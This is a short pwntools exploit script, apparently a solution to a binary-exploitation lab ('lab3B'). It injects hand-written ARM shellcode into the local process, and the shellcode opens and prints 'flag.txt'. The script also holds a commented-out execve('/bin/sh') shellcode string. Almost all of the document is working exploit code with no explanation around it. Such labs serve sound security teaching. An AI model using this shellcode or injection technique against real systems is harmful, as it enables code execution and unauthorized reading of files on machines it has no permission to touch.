#!/usr/bin/env python

from pwn import *

r = process(['./lab3B'])
print util.proc.pidof(r)
pause()

# exec('/bin/sh') shellcode
#sc = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x00"

# code to switch from ARM to THUMB mode

code = """
.global main

main:
	b one

two:
	mov r0, lr
	mov r7, #5
	mov r1, #0
	mov r2, #0
	svc 0

	mov r5, r0
	b read

exit:
	mov r7, #1
	mov r0, #10
	svc 0

read:
	mov r0, r5
	mov r7, #3
	sub sp, sp, #1
	mov r1, sp
	mov r2, #1
	svc 0

	cmp r0, #0
	beq exit

	mov r7, #4
	mov r0, #1
	mov r2, #1
	svc 0

	add sp, sp, #1
	b read

one:
	bl two
	.string "flag.txt"
"""

sc = asm(code, arch = 'arm', os = 'linux', bits=32)

r.sendline(sc)

r.interactive()
